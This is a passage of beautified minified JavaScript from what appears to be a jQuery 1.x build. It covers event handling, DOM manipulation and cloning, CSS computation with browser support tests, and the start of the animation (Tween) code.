            a.isDefaultPrevented() && n.preventDefault()
        }
    },
    k.removeEvent = Y.removeEventListener ? function(e, t, n) {
        e.removeEventListener && e.removeEventListener(t, n, !1)
    }
    : function(e, t, n) {
        var i = "on" + t;
        e.detachEvent && (typeof e[i] === O && (e[i] = null),
        e.detachEvent(i, n))
    }
    ,
    k.Event = function(e, t) {
        return this instanceof k.Event ? (e && e.type ? (this.originalEvent = e,
        this.type = e.type,
        this.isDefaultPrevented = e.defaultPrevented || void 0 === e.defaultPrevented && (!1 === e.returnValue || e.getPreventDefault && e.getPreventDefault()) ? Z : ee) : this.type = e,
        t && k.extend(this, t),
        this.timeStamp = e && e.timeStamp || k.now(),
        void (this[k.expando] = !0)) : new k.Event(e,t)
    }
    ,
    k.Event.prototype = {
        isDefaultPrevented: ee,
        isPropagationStopped: ee,
        isImmediatePropagationStopped: ee,
        preventDefault: function() {
            var e = this.originalEvent;
            this.isDefaultPrevented = Z,
            e && (e.preventDefault ? e.preventDefault() : e.returnValue = !1)
        },
        stopPropagation: function() {
            var e = this.originalEvent;
            this.isPropagationStopped = Z,
            e && (e.stopPropagation && e.stopPropagation(),
            e.cancelBubble = !0)
        },
        stopImmediatePropagation: function() {
            this.isImmediatePropagationStopped = Z,
            this.stopPropagation()
        }
    },
    k.each({
        mouseenter: "mouseover",
        mouseleave: "mouseout"
    }, function(e, a) {
        k.event.special[e] = {
            delegateType: a,
            bindType: a,
            handle: function(e) {
                var t, n = e.relatedTarget, i = e.handleObj;
                return n && (n === this || k.contains(this, n)) || (e.type = i.origType,
                t = i.handler.apply(this, arguments),
                e.type = a),
                t
            }
        }
    }),
    g.submitBubbles || (k.event.special.submit = {
        setup: function() {
            return !k.nodeName(this, "form") && void k.event.add(this, "click._submit keypress._submit", function(e) {
                var t = e.target
                  , n = k.nodeName(t, "input") || k.nodeName(t, "button") ? t.form : void 0;
                n && !k._data(n, "submitBubbles") && (k.event.add(n, "submit._submit", function(e) {
                    e._submit_bubble = !0
                }),
                k._data(n, "submitBubbles", !0))
            })
        },
        postDispatch: function(e) {
            e._submit_bubble && (delete e._submit_bubble,
            this.parentNode && !e.isTrigger && k.event.simulate("submit", this.parentNode, e, !0))
        },
        teardown: function() {
            return !k.nodeName(this, "form") && void k.event.remove(this, "._submit")
        }
    }),
    g.changeBubbles || (k.event.special.change = {
        setup: function() {
            return V.test(this.nodeName) ? ("checkbox" !== this.type && "radio" !== this.type || (k.event.add(this, "propertychange._change", function(e) {
                "checked" === e.originalEvent.propertyName && (this._just_changed = !0)
            }),
            k.event.add(this, "click._change", function(e) {
                this._just_changed && !e.isTrigger && (this._just_changed = !1),
                k.event.simulate("change", this, e, !0)
            })),
            !1) : void k.event.add(this, "beforeactivate._change", function(e) {
                var t = e.target;
                V.test(t.nodeName) && !k._data(t, "changeBubbles") && (k.event.add(t, "change._change", function(e) {
                    !this.parentNode || e.isSimulated || e.isTrigger || k.event.simulate("change", this.parentNode, e, !0)
                }),
                k._data(t, "changeBubbles", !0))
            })
        },
        handle: function(e) {
            var t = e.target;
            return this !== t || e.isSimulated || e.isTrigger || "radio" !== t.type && "checkbox" !== t.type ? e.handleObj.handler.apply(this, arguments) : void 0
        },
        teardown: function() {
            return k.event.remove(this, "._change"),
            !V.test(this.nodeName)
        }
    }),
    g.focusinBubbles || k.each({
        focus: "focusin",
        blur: "focusout"
    }, function(n, i) {
        function a(e) {
            k.event.simulate(i, e.target, k.event.fix(e), !0)
        }
        k.event.special[i] = {
            setup: function() {
                var e = this.ownerDocument || this
                  , t = k._data(e, i);
                t || e.addEventListener(n, a, !0),
                k._data(e, i, (t || 0) + 1)
            },
            teardown: function() {
                var e = this.ownerDocument || this
                  , t = k._data(e, i) - 1;
                t ? k._data(e, i, t) : (e.removeEventListener(n, a, !0),
                k._removeData(e, i))
            }
        }
    }),
    k.fn.extend({
        on: function(e, t, n, i, a) {
            var s, r;
            if ("object" == typeof e) {
                for (s in "string" != typeof t && (n = n || t,
                t = void 0),
                e)
                    this.on(s, t, n, e[s], a);
                return this
            }
            if (null == n && null == i ? (i = t,
            n = t = void 0) : null == i && ("string" == typeof t ? (i = n,
            n = void 0) : (i = n,
            n = t,
            t = void 0)),
            !1 === i)
                i = ee;
            else if (!i)
                return this;
            return 1 === a && (r = i,
            (i = function(e) {
                return k().off(e),
                r.apply(this, arguments)
            }
            ).guid = r.guid || (r.guid = k.guid++)),
            this.each(function() {
                k.event.add(this, e, i, n, t)
            })
        },
        one: function(e, t, n, i) {
            return this.on(e, t, n, i, 1)
        },
        off: function(e, t, n) {
            var i, a;
            if (e && e.preventDefault && e.handleObj)
                return i = e.handleObj,
                k(e.delegateTarget).off(i.namespace ? i.origType + "." + i.namespace : i.origType, i.selector, i.handler),
                this;
            if ("object" != typeof e)
                return !1 !== t && "function" != typeof t || (n = t,
                t = void 0),
                !1 === n && (n = ee),
                this.each(function() {
                    k.event.remove(this, e, n, t)
                });
            for (a in e)
                this.off(a, t, e[a]);
            return this
        },
        trigger: function(e, t) {
            return this.each(function() {
                k.event.trigger(e, t, this)
            })
        },
        triggerHandler: function(e, t) {
            var n = this[0];
            return n ? k.event.trigger(e, t, n, !0) : void 0
        }
    });
    var ie = "abbr|article|aside|audio|bdi|canvas|data|datalist|details|figcaption|figure|footer|header|hgroup|mark|meter|nav|output|progress|section|summary|time|video"
      , ae = / jQuery\d+="(?:null|\d+)"/g
      , se = new RegExp("<(?:" + ie + ")[\\s/>]","i")
      , re = /^\s+/
      , oe = /<(?!area|br|col|embed|hr|img|input|link|meta|param)(([\w:]+)[^>]*)\/>/gi
      , le = /<([\w:]+)/
      , de = /<tbody/i
      , ue = /<|&#?\w+;/
      , ce = /<(?:script|style|link)/i
      , he = /checked\s*(?:[^=]|=\s*.checked.)/i
      , me = /^$|\/(?:java|ecma)script/i
      , fe = /^true\/(.*)/
      , pe = /^\s*<!(?:\[CDATA\[|--)|(?:\]\]|--)>\s*$/g
      , _e = {
        option: [1, "<select multiple='multiple'>", "</select>"],
        legend: [1, "<fieldset>", "</fieldset>"],
        area: [1, "<map>", "</map>"],
        param: [1, "<object>", "</object>"],
        thead: [1, "<table>", "</table>"],
        tr: [2, "<table><tbody>", "</tbody></table>"],
        col: [2, "<table><tbody></tbody><colgroup>", "</colgroup></table>"],
        td: [3, "<table><tbody><tr>", "</tr></tbody></table>"],
        _default: g.htmlSerialize ? [0, "", ""] : [1, "X<div>", "</div>"]
    }
      , ge = ne(Y).appendChild(Y.createElement("div"));
    function ye(e, t) {
        var n, i, a = 0, s = typeof e.getElementsByTagName !== O ? e.getElementsByTagName(t || "*") : typeof e.querySelectorAll !== O ? e.querySelectorAll(t || "*") : void 0;
        if (!s)
            for (s = [],
            n = e.childNodes || e; null != (i = n[a]); a++)
                !t || k.nodeName(i, t) ? s.push(i) : k.merge(s, ye(i, t));
        return void 0 === t || t && k.nodeName(e, t) ? k.merge([e], s) : s
    }
    function ve(e) {
        J.test(e.type) && (e.defaultChecked = e.checked)
    }
    function Me(e, t) {
        return k.nodeName(e, "table") && k.nodeName(11 !== t.nodeType ? t : t.firstChild, "tr") ? e.getElementsByTagName("tbody")[0] || e.appendChild(e.ownerDocument.createElement("tbody")) : e
    }
    function Le(e) {
        return e.type = (null !== k.find.attr(e, "type")) + "/" + e.type,
        e
    }
    function be(e) {
        var t = fe.exec(e.type);
        return t ? e.type = t[1] : e.removeAttribute("type"),
        e
    }
    function ke(e, t) {
        for (var n, i = 0; null != (n = e[i]); i++)
            k._data(n, "globalEval", !t || k._data(t[i], "globalEval"))
    }
    function De(e, t) {
        if (1 === t.nodeType && k.hasData(e)) {
            var n, i, a, s = k._data(e), r = k._data(t, s), o = s.events;
            if (o)
                for (n in delete r.handle,
                r.events = {},
                o)
                    for (i = 0,
                    a = o[n].length; i < a; i++)
                        k.event.add(t, n, o[n][i]);
            r.data && (r.data = k.extend({}, r.data))
        }
    }
    function Ye(e, t) {
        var n, i, a;
        if (1 === t.nodeType) {
            if (n = t.nodeName.toLowerCase(),
            !g.noCloneEvent && t[k.expando]) {
                for (i in (a = k._data(t)).events)
                    k.removeEvent(t, i, a.handle);
                t.removeAttribute(k.expando)
            }
            "script" === n && t.text !== e.text ? (Le(t).text = e.text,
            be(t)) : "object" === n ? (t.parentNode && (t.outerHTML = e.outerHTML),
            g.html5Clone && e.innerHTML && !k.trim(t.innerHTML) && (t.innerHTML = e.innerHTML)) : "input" === n && J.test(e.type) ? (t.defaultChecked = t.checked = e.checked,
            t.value !== e.value && (t.value = e.value)) : "option" === n ? t.defaultSelected = t.selected = e.defaultSelected : "input" !== n && "textarea" !== n || (t.defaultValue = e.defaultValue)
        }
    }
    _e.optgroup = _e.option,
    _e.tbody = _e.tfoot = _e.colgroup = _e.caption = _e.thead,
    _e.th = _e.td,
    k.extend({
        clone: function(e, t, n) {
            var i, a, s, r, o, l = k.contains(e.ownerDocument, e);
            if (g.html5Clone || k.isXMLDoc(e) || !se.test("<" + e.nodeName + ">") ? s = e.cloneNode(!0) : (ge.innerHTML = e.outerHTML,
            ge.removeChild(s = ge.firstChild)),
            !(g.noCloneEvent && g.noCloneChecked || 1 !== e.nodeType && 11 !== e.nodeType || k.isXMLDoc(e)))
                for (i = ye(s),
                o = ye(e),
                r = 0; null != (a = o[r]); ++r)
                    i[r] && Ye(a, i[r]);
            if (t)
                if (n)
                    for (o = o || ye(e),
                    i = i || ye(s),
                    r = 0; null != (a = o[r]); r++)
                        De(a, i[r]);
                else
                    De(e, s);
            return 0 < (i = ye(s, "script")).length && ke(i, !l && ye(e, "script")),
            i = o = a = null,
            s
        },
        buildFragment: function(e, t, n, i) {
            for (var a, s, r, o, l, d, u, c = e.length, h = ne(t), m = [], f = 0; f < c; f++)
                if ((s = e[f]) || 0 === s)
                    if ("object" === k.type(s))
                        k.merge(m, s.nodeType ? [s] : s);
                    else if (ue.test(s)) {
                        for (o = o || h.appendChild(t.createElement("div")),
                        l = (le.exec(s) || ["", ""])[1].toLowerCase(),
                        u = _e[l] || _e._default,
                        o.innerHTML = u[1] + s.replace(oe, "<$1></$2>") + u[2],
                        a = u[0]; a--; )
                            o = o.lastChild;
                        if (!g.leadingWhitespace && re.test(s) && m.push(t.createTextNode(re.exec(s)[0])),
                        !g.tbody)
                            for (a = (s = "table" !== l || de.test(s) ? "<table>" !== u[1] || de.test(s) ? 0 : o : o.firstChild) && s.childNodes.length; a--; )
                                k.nodeName(d = s.childNodes[a], "tbody") && !d.childNodes.length && s.removeChild(d);
                        for (k.merge(m, o.childNodes),
                        o.textContent = ""; o.firstChild; )
                            o.removeChild(o.firstChild);
                        o = h.lastChild
                    } else
                        m.push(t.createTextNode(s));
            for (o && h.removeChild(o),
            g.appendChecked || k.grep(ye(m, "input"), ve),
            f = 0; s = m[f++]; )
                if ((!i || -1 === k.inArray(s, i)) && (r = k.contains(s.ownerDocument, s),
                o = ye(h.appendChild(s), "script"),
                r && ke(o),
                n))
                    for (a = 0; s = o[a++]; )
                        me.test(s.type || "") && n.push(s);
            return o = null,
            h
        },
        cleanData: function(e, t) {
            for (var n, i, a, s, r = 0, o = k.expando, l = k.cache, d = g.deleteExpando, u = k.event.special; null != (n = e[r]); r++)
                if ((t || k.acceptData(n)) && (s = (a = n[o]) && l[a])) {
                    if (s.events)
                        for (i in s.events)
                            u[i] ? k.event.remove(n, i) : k.removeEvent(n, i, s.handle);
                    l[a] && (delete l[a],
                    d ? delete n[o] : typeof n.removeAttribute !== O ? n.removeAttribute(o) : n[o] = null,
                    c.push(a))
                }
        }
    }),
    k.fn.extend({
        text: function(e) {
            return U(this, function(e) {
                return void 0 === e ? k.text(this) : this.empty().append((this[0] && this[0].ownerDocument || Y).createTextNode(e))
            }, null, e, arguments.length)
        },
        append: function() {
            return this.domManip(arguments, function(e) {
                1 !== this.nodeType && 11 !== this.nodeType && 9 !== this.nodeType || Me(this, e).appendChild(e)
            })
        },
        prepend: function() {
            return this.domManip(arguments, function(e) {
                if (1 === this.nodeType || 11 === this.nodeType || 9 === this.nodeType) {
                    var t = Me(this, e);
                    t.insertBefore(e, t.firstChild)
                }
            })
        },
        before: function() {
            return this.domManip(arguments, function(e) {
                this.parentNode && this.parentNode.insertBefore(e, this)
            })
        },
        after: function() {
            return this.domManip(arguments, function(e) {
                this.parentNode && this.parentNode.insertBefore(e, this.nextSibling)
            })
        },
        remove: function(e, t) {
            for (var n, i = e ? k.filter(e, this) : this, a = 0; null != (n = i[a]); a++)
                t || 1 !== n.nodeType || k.cleanData(ye(n)),
                n.parentNode && (t && k.contains(n.ownerDocument, n) && ke(ye(n, "script")),
                n.parentNode.removeChild(n));
            return this
        },
        empty: function() {
            for (var e, t = 0; null != (e = this[t]); t++) {
                for (1 === e.nodeType && k.cleanData(ye(e, !1)); e.firstChild; )
                    e.removeChild(e.firstChild);
                e.options && k.nodeName(e, "select") && (e.options.length = 0)
            }
            return this
        },
        clone: function(e, t) {
            return e = null != e && e,
            t = null == t ? e : t,
            this.map(function() {
                return k.clone(this, e, t)
            })
        },
        html: function(e) {
            return U(this, function(e) {
                var t = this[0] || {}
                  , n = 0
                  , i = this.length;
                if (void 0 === e)
                    return 1 === t.nodeType ? t.innerHTML.replace(ae, "") : void 0;
                if (!("string" != typeof e || ce.test(e) || !g.htmlSerialize && se.test(e) || !g.leadingWhitespace && re.test(e) || _e[(le.exec(e) || ["", ""])[1].toLowerCase()])) {
                    e = e.replace(oe, "<$1></$2>");
                    try {
                        for (; n < i; n++)
                            1 === (t = this[n] || {}).nodeType && (k.cleanData(ye(t, !1)),
                            t.innerHTML = e);
                        t = 0
                    } catch (e) {}
                }
                t && this.empty().append(e)
            }, null, e, arguments.length)
        },
        replaceWith: function() {
            var t = arguments[0];
            return this.domManip(arguments, function(e) {
                t = this.parentNode,
                k.cleanData(ye(this)),
                t && t.replaceChild(e, this)
            }),
            t && (t.length || t.nodeType) ? this : this.remove()
        },
        detach: function(e) {
            return this.remove(e, !0)
        },
        domManip: function(n, i) {
            n = p.apply([], n);
            var e, t, a, s, r, o, l = 0, d = this.length, u = this, c = d - 1, h = n[0], m = k.isFunction(h);
            if (m || 1 < d && "string" == typeof h && !g.checkClone && he.test(h))
                return this.each(function(e) {
                    var t = u.eq(e);
                    m && (n[0] = h.call(this, e, t.html())),
                    t.domManip(n, i)
                });
            if (d && (e = (o = k.buildFragment(n, this[0].ownerDocument, !1, this)).firstChild,
            1 === o.childNodes.length && (o = e),
            e)) {
                for (a = (s = k.map(ye(o, "script"), Le)).length; l < d; l++)
                    t = o,
                    l !== c && (t = k.clone(t, !0, !0),
                    a && k.merge(s, ye(t, "script"))),
                    i.call(this[l], t, l);
                if (a)
                    for (r = s[s.length - 1].ownerDocument,
                    k.map(s, be),
                    l = 0; l < a; l++)
                        t = s[l],
                        me.test(t.type || "") && !k._data(t, "globalEval") && k.contains(r, t) && (t.src ? k._evalUrl && k._evalUrl(t.src) : k.globalEval((t.text || t.textContent || t.innerHTML || "").replace(pe, "")));
                o = e = null
            }
            return this
        }
    }),
    k.each({
        appendTo: "append",
        prependTo: "prepend",
        insertBefore: "before",
        insertAfter: "after",
        replaceAll: "replaceWith"
    }, function(e, r) {
        k.fn[e] = function(e) {
            for (var t, n = 0, i = [], a = k(e), s = a.length - 1; n <= s; n++)
                t = n === s ? this : this.clone(!0),
                k(a[n])[r](t),
                o.apply(i, t.get());
            return this.pushStack(i)
        }
    });
    var we, Te, Se, xe, He = {};
    function Ee(e, t) {
        var n = k(t.createElement(e)).appendTo(t.body)
          , i = f.getDefaultComputedStyle ? f.getDefaultComputedStyle(n[0]).display : k.css(n[0], "display");
        return n.detach(),
        i
    }
    function je(e) {
        var t = Y
          , n = He[e];
        return n || ("none" !== (n = Ee(e, t)) && n || ((t = ((we = (we || k("<iframe frameborder='0' width='0' height='0'/>")).appendTo(t.documentElement))[0].contentWindow || we[0].contentDocument).document).write(),
        t.close(),
        n = Ee(e, t),
        we.detach()),
        He[e] = n),
        n
    }
    (xe = Y.createElement("div")).innerHTML = "  <link/><table></table><a href='/a'>a</a><input type='checkbox'/>",
    (Te = xe.getElementsByTagName("a")[0]).style.cssText = "float:left;opacity:.5",
    g.opacity = /^0.5/.test(Te.style.opacity),
    g.cssFloat = !!Te.style.cssFloat,
    xe.style.backgroundClip = "content-box",
    xe.cloneNode(!0).style.backgroundClip = "",
    g.clearCloneStyle = "content-box" === xe.style.backgroundClip,
    Te = xe = null,
    g.shrinkWrapBlocks = function() {
        var e, t, n;
        if (null == Se) {
            if (!(e = Y.getElementsByTagName("body")[0]))
                return;
            t = Y.createElement("div"),
            n = Y.createElement("div"),
            e.appendChild(t).appendChild(n),
            Se = !1,
            typeof n.style.zoom !== O && (n.style.cssText = "-webkit-box-sizing:content-box;-moz-box-sizing:content-box;box-sizing:content-box;display:block;padding:0;margin:0;border:0;width:1px;padding:1px;zoom:1",
            n.innerHTML = "<div></div>",
            n.firstChild.style.width = "5px",
            Se = 3 !== n.offsetWidth),
            e.removeChild(t),
            e = t = n = null
        }
        return Se
    }
    ;
    var Ce, Ae, Pe, Oe, Ne, Fe, We, Ie, ze, Re, $e = /^margin/, Be = new RegExp("^(" + B + ")(?!px)[a-z%]+$","i"), qe = /^(top|right|bottom|left)$/;
    function Ue(t, n) {
        return {
            get: function() {
                var e = t();
                if (null != e)
                    return e ? void delete this.get : (this.get = n).apply(this, arguments)
            }
        }
    }
    function Je() {
        var e, t, n = Y.getElementsByTagName("body")[0];
        n && (e = Y.createElement("div"),
        t = Y.createElement("div"),
        e.style.cssText = Re,
        n.appendChild(e).appendChild(t),
        t.style.cssText = "-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;position:absolute;display:block;padding:1px;border:1px;width:4px;margin-top:1%;top:1%",
        k.swap(n, null != n.style.zoom ? {
            zoom: 1
        } : {}, function() {
            Ne = 4 === t.offsetWidth
        }),
        Ie = !(We = !(Fe = !0)),
        f.getComputedStyle && (We = "1%" !== (f.getComputedStyle(t, null) || {}).top,
        Fe = "4px" === (f.getComputedStyle(t, null) || {
            width: "4px"
        }).width),
        n.removeChild(e),
        t = n = null)
    }
    f.getComputedStyle ? (Ce = function(e) {
        return e.ownerDocument.defaultView.getComputedStyle(e, null)
    }
    ,
    Ae = function(e, t, n) {
        var i, a, s, r, o = e.style;
        return r = (n = n || Ce(e)) ? n.getPropertyValue(t) || n[t] : void 0,
        n && ("" !== r || k.contains(e.ownerDocument, e) || (r = k.style(e, t)),
        Be.test(r) && $e.test(t) && (i = o.width,
        a = o.minWidth,
        s = o.maxWidth,
        o.minWidth = o.maxWidth = o.width = r,
        r = n.width,
        o.width = i,
        o.minWidth = a,
        o.maxWidth = s)),
        void 0 === r ? r : r + ""
    }
    ) : Y.documentElement.currentStyle && (Ce = function(e) {
        return e.currentStyle
    }
    ,
    Ae = function(e, t, n) {
        var i, a, s, r, o = e.style;
        return null == (r = (n = n || Ce(e)) ? n[t] : void 0) && o && o[t] && (r = o[t]),
        Be.test(r) && !qe.test(t) && (i = o.left,
        (s = (a = e.runtimeStyle) && a.left) && (a.left = e.currentStyle.left),
        o.left = "fontSize" === t ? "1em" : r,
        r = o.pixelLeft + "px",
        o.left = i,
        s && (a.left = s)),
        void 0 === r ? r : r + "" || "auto"
    }
    ),
    ze = Y.createElement("div"),
    Re = "border:0;width:0;height:0;position:absolute;top:0;left:-9999px",
    ze.innerHTML = "  <link/><table></table><a href='/a'>a</a><input type='checkbox'/>",
    (Pe = ze.getElementsByTagName("a")[0]).style.cssText = "float:left;opacity:.5",
    g.opacity = /^0.5/.test(Pe.style.opacity),
    g.cssFloat = !!Pe.style.cssFloat,
    ze.style.backgroundClip = "content-box",
    ze.cloneNode(!0).style.backgroundClip = "",
    g.clearCloneStyle = "content-box" === ze.style.backgroundClip,
    Pe = ze = null,
    k.extend(g, {
        reliableHiddenOffsets: function() {
            if (null != Oe)
                return Oe;
            var e, t, n, i = Y.createElement("div"), a = Y.getElementsByTagName("body")[0];
            return a ? (i.setAttribute("className", "t"),
            i.innerHTML = "  <link/><table></table><a href='/a'>a</a><input type='checkbox'/>",
            (e = Y.createElement("div")).style.cssText = Re,
            a.appendChild(e).appendChild(i),
            i.innerHTML = "<table><tr><td></td><td>t</td></tr></table>",
            (t = i.getElementsByTagName("td"))[0].style.cssText = "padding:0;margin:0;border:0;display:none",
            n = 0 === t[0].offsetHeight,
            t[0].style.display = "",
            t[1].style.display = "none",
            Oe = n && 0 === t[0].offsetHeight,
            a.removeChild(e),
            i = a = null,
            Oe) : void 0
        },
        boxSizing: function() {
            return null == Ne && Je(),
            Ne
        },
        boxSizingReliable: function() {
            return null == Fe && Je(),
            Fe
        },
        pixelPosition: function() {
            return null == We && Je(),
            We
        },
        reliableMarginRight: function() {
            var e, t, n, i;
            if (null == Ie && f.getComputedStyle) {
                if (!(e = Y.getElementsByTagName("body")[0]))
                    return;
                t = Y.createElement("div"),
                n = Y.createElement("div"),
                t.style.cssText = Re,
                e.appendChild(t).appendChild(n),
                (i = n.appendChild(Y.createElement("div"))).style.cssText = n.style.cssText = "-webkit-box-sizing:content-box;-moz-box-sizing:content-box;box-sizing:content-box;display:block;padding:0;margin:0;border:0",
                i.style.marginRight = i.style.width = "0",
                n.style.width = "1px",
                Ie = !parseFloat((f.getComputedStyle(i, null) || {}).marginRight),
                e.removeChild(t)
            }
            return Ie
        }
    }),
    k.swap = function(e, t, n, i) {
        var a, s, r = {};
        for (s in t)
            r[s] = e.style[s],
            e.style[s] = t[s];
        for (s in a = n.apply(e, i || []),
        t)
            e.style[s] = r[s];
        return a
    }
    ;
    var Ve = /alpha\([^)]*\)/i
      , Ge = /opacity\s*=\s*([^)]*)/
      , Xe = /^(none|table(?!-c[ea]).+)/
      , Ke = new RegExp("^(" + B + ")(.*)$","i")
      , Qe = new RegExp("^([+-])=(" + B + ")","i")
      , Ze = {
        position: "absolute",
        visibility: "hidden",
        display: "block"
    }
      , et = {
        letterSpacing: 0,
        fontWeight: 400
    }
      , tt = ["Webkit", "O", "Moz", "ms"];
    function nt(e, t) {
        if (t in e)
            return t;
        for (var n = t.charAt(0).toUpperCase() + t.slice(1), i = t, a = tt.length; a--; )
            if ((t = tt[a] + n)in e)
                return t;
        return i
    }
    function it(e, t) {
        for (var n, i, a, s = [], r = 0, o = e.length; r < o; r++)
            (i = e[r]).style && (s[r] = k._data(i, "olddisplay"),
            n = i.style.display,
            t ? (s[r] || "none" !== n || (i.style.display = ""),
            "" === i.style.display && $(i) && (s[r] = k._data(i, "olddisplay", je(i.nodeName)))) : s[r] || (a = $(i),
            (n && "none" !== n || !a) && k._data(i, "olddisplay", a ? n : k.css(i, "display"))));
        for (r = 0; r < o; r++)
            (i = e[r]).style && (t && "none" !== i.style.display && "" !== i.style.display || (i.style.display = t ? s[r] || "" : "none"));
        return e
    }
    function at(e, t, n) {
        var i = Ke.exec(t);
        return i ? Math.max(0, i[1] - (n || 0)) + (i[2] || "px") : t
    }
    function st(e, t, n, i, a) {
        for (var s = n === (i ? "border" : "content") ? 4 : "width" === t ? 1 : 0, r = 0; s < 4; s += 2)
            "margin" === n && (r += k.css(e, n + q[s], !0, a)),
            i ? ("content" === n && (r -= k.css(e, "padding" + q[s], !0, a)),
            "margin" !== n && (r -= k.css(e, "border" + q[s] + "Width", !0, a))) : (r += k.css(e, "padding" + q[s], !0, a),
            "padding" !== n && (r += k.css(e, "border" + q[s] + "Width", !0, a)));
        return r
    }
    function rt(e, t, n) {
        var i = !0
          , a = "width" === t ? e.offsetWidth : e.offsetHeight
          , s = Ce(e)
          , r = g.boxSizing() && "border-box" === k.css(e, "boxSizing", !1, s);
        if (a <= 0 || null == a) {
            if (((a = Ae(e, t, s)) < 0 || null == a) && (a = e.style[t]),
            Be.test(a))
                return a;
            i = r && (g.boxSizingReliable() || a === e.style[t]),
            a = parseFloat(a) || 0
        }
        return a + st(e, t, n || (r ? "border" : "content"), i, s) + "px"
    }
    function ot(e, t, n, i, a) {
        return new ot.prototype.init(e,t,n,i,a)
    }
    k.extend({
        cssHooks: {
            opacity: {
                get: function(e, t) {
                    if (t) {
                        var n = Ae(e, "opacity");
                        return "" === n ? "1" : n
                    }
                }
            }
        },
        cssNumber: {
            columnCount: !0,
            fillOpacity: !0,
            fontWeight: !0,
            lineHeight: !0,
            opacity: !0,
            order: !0,
            orphans: !0,
            widows: !0,
            zIndex: !0,
            zoom: !0
        },
        cssProps: {
            float: g.cssFloat ? "cssFloat" : "styleFloat"
        },
        style: function(e, t, n, i) {
            if (e && 3 !== e.nodeType && 8 !== e.nodeType && e.style) {
                var a, s, r, o = k.camelCase(t), l = e.style;
                if (t = k.cssProps[o] || (k.cssProps[o] = nt(l, o)),
                r = k.cssHooks[t] || k.cssHooks[o],
                void 0 === n)
                    return r && "get"in r && void 0 !== (a = r.get(e, !1, i)) ? a : l[t];
                if ("string" === (s = typeof n) && (a = Qe.exec(n)) && (n = (a[1] + 1) * a[2] + parseFloat(k.css(e, t)),
                s = "number"),
                null != n && n == n && ("number" !== s || k.cssNumber[o] || (n += "px"),
                g.clearCloneStyle || "" !== n || 0 !== t.indexOf("background") || (l[t] = "inherit"),
                !(r && "set"in r && void 0 === (n = r.set(e, n, i)))))
                    try {
                        l[t] = "",
                        l[t] = n
                    } catch (e) {}
            }
        },
        css: function(e, t, n, i) {
            var a, s, r, o = k.camelCase(t);
            return t = k.cssProps[o] || (k.cssProps[o] = nt(e.style, o)),
            (r = k.cssHooks[t] || k.cssHooks[o]) && "get"in r && (s = r.get(e, !0, n)),
            void 0 === s && (s = Ae(e, t, i)),
            "normal" === s && t in et && (s = et[t]),
            "" === n || n ? (a = parseFloat(s),
            !0 === n || k.isNumeric(a) ? a || 0 : s) : s
        }
    }),
    k.each(["height", "width"], function(e, a) {
        k.cssHooks[a] = {
            get: function(e, t, n) {
                return t ? 0 === e.offsetWidth && Xe.test(k.css(e, "display")) ? k.swap(e, Ze, function() {
                    return rt(e, a, n)
                }) : rt(e, a, n) : void 0
            },
            set: function(e, t, n) {
                var i = n && Ce(e);
                return at(0, t, n ? st(e, a, n, g.boxSizing() && "border-box" === k.css(e, "boxSizing", !1, i), i) : 0)
            }
        }
    }),
    g.opacity || (k.cssHooks.opacity = {
        get: function(e, t) {
            return Ge.test((t && e.currentStyle ? e.currentStyle.filter : e.style.filter) || "") ? .01 * parseFloat(RegExp.$1) + "" : t ? "1" : ""
        },
        set: function(e, t) {
            var n = e.style
              , i = e.currentStyle
              , a = k.isNumeric(t) ? "alpha(opacity=" + 100 * t + ")" : ""
              , s = i && i.filter || n.filter || "";
            ((n.zoom = 1) <= t || "" === t) && "" === k.trim(s.replace(Ve, "")) && n.removeAttribute && (n.removeAttribute("filter"),
            "" === t || i && !i.filter) || (n.filter = Ve.test(s) ? s.replace(Ve, a) : s + " " + a)
        }
    }),
    k.cssHooks.marginRight = Ue(g.reliableMarginRight, function(e, t) {
        return t ? k.swap(e, {
            display: "inline-block"
        }, Ae, [e, "marginRight"]) : void 0
    }),
    k.each({
        margin: "",
        padding: "",
        border: "Width"
    }, function(a, s) {
        k.cssHooks[a + s] = {
            expand: function(e) {
                for (var t = 0, n = {}, i = "string" == typeof e ? e.split(" ") : [e]; t < 4; t++)
                    n[a + q[t] + s] = i[t] || i[t - 2] || i[0];
                return n
            }
        },
        $e.test(a) || (k.cssHooks[a + s].set = at)
    }),
    k.fn.extend({
        css: function(e, t) {
            return U(this, function(e, t, n) {
                var i, a, s = {}, r = 0;
                if (k.isArray(t)) {
                    for (i = Ce(e),
                    a = t.length; r < a; r++)
                        s[t[r]] = k.css(e, t[r], !1, i);
                    return s
                }
                return void 0 !== n ? k.style(e, t, n) : k.css(e, t)
            }, e, t, 1 < arguments.length)
        },
        show: function() {
            return it(this, !0)
        },
        hide: function() {
            return it(this)
        },
        toggle: function(e) {
            return "boolean" == typeof e ? e ? this.show() : this.hide() : this.each(function() {
                $(this) ? k(this).show() : k(this).hide()
            })
        }
    }),
    ((k.Tween = ot).prototype = {
        constructor: ot,
        init: function(e, t, n, i, a, s) {
            this.elem = e,
            this.prop = n,
            this.easing = a || "swing",
            this.options = t,
            this.start = this.now = this.cur(),
            this.end = i,
            this.unit = s || (k.cssNumber[n] ? "" : "px")
        },
        cur: function() {
            var e = ot.propHooks[this.prop];
            return e && e.get ? e.get(this) : ot.propHooks._default.get(this)
        },
        run: function(e) {
            var t, n = ot.propHooks[this.prop];
            return this.pos = t = this.options.duration ? k.easing[this.easing](e, this.options.duration * e, 0, 1, this.options.duration) : e,
            this.now = (this.end - this.start) * t + this.start,
            this.options.step && this.options.step.call(this.elem, this.now, this),
            n && n.set ? n.set(this) : ot.propHooks._default.set(this),
            this
        }
    }).init.prototype = ot.prototype,
    (ot.propHooks = {
        _default: {
            get: function(e) {
                var t;
                return null == e.elem[e.prop] || e.elem.style && null != e.elem.style[e.prop] ? (t = k.css(e.elem, e.prop, "")) && "auto" !== t ? t : 0 : e.elem[e.prop]
            },
            set: function(e) {
                k.fx.step[e.prop] ? k.fx.step[e.prop](e) : e.elem.style && (null != e.elem.style[k.cssProps[e.prop]] || k.cssHooks[e.prop]) ? k.style(e.elem, e.prop, e.now + e.unit) : e.elem[e.prop] = e.now
            }
        }
    }).scrollTop = ot.propHooks.scrollLeft = {
        set: function(e) {
            e.elem.nodeType && e.elem.parentNode && (e.elem[e.prop] = e.now)
        }
    },
    k.easing = {
        linear: function(e) {
            return e
        },
        swing: function(e) {
            return .5 - Math.cos(e * Math.PI) / 2
        }
    },
    k.fx = ot.prototype.init,
    k.fx.step = {};
